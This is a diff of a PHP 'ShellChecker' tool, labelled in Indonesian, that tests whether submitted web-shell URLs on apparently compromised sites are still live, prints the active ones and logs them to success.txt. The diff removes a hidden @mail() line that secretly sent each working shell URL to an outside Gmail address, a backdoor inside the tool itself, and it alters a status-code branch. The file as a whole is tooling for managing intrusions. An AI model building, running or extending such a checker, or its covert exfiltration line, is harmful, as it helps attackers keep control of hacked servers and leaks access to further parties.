@@ -43,15 +43,15 @@ function get_http_response_code($theurl) {
         $judul = "shell: $theurl ";
         $body = "shell: $theurl";
         if (!empty($theurl)) {
-/// I hate myself go delete this line            @mail("mecus.mecus.mecus@gmail.com", $judul, $body);
+/// I hate myself go delete this line            @mail("", $judul, $body);
         }
         $writeuRl = $theurl . "
 ";
         $fh = fopen("success.txt", "a");
         fwrite($fh, $writeuRl, strlen($writeuRl));
         echo "<strong><font color=Green>AKTIF </font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
-    } elseif ($status == 500) {
-        echo "<strong><font color=black>" . $status . " 500</font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
+    } elseif ($status == 200) {
+        echo "<strong><font color=black>" . $status . " 200</font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
     } else {
         $writeuRl = $theurl . "
 ";
@@ -74,6 +74,6 @@ if (isset($_POST['Submit'])) {
 ?>
 
 
-<font color='black'><br><i><b>Note : Pengecekan Cangkang, Apakah ia Berfungsi Sebagai Cangkang Aktif Atau Tidak,</i></br></b>
+<font color='black'><br><i><b>Note : Pengecekan Cangkang, Apakah ia Berfungsi Sebagai Cangkang Aktif Atau Tidak Aktif,</i></br></b>
 <title>[!] ShellChecker cUs [!]</title>
 </html>
